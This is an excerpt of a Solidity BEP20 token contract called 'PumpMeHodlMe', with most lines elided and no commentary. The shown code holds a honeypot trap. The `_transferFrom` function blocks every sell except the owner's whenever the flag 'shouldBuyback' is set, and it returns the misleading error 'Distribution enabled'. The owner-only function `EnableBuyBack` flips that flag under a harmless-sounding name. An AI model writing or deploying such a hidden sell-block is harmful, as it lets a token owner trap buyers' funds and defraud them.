...
contract PUMPEMEHODLME is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "PumpMeHodlMe";
    string constant _symbol = "PMHM";
    ...
    address public autoLiquidityReceiver=0x1c6233cA853e4360a3711345b98000fE447a2887;
    address public marketingFeeReceiver=0x1c6233cA853e4360a3711345b98000fE447a2887;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!shouldBuyback || sender==owner), "Distribution enabled");
    ...
    function EnableBuyBack(bool value) external onlyOwner {
        shouldBuyback = value;
    }
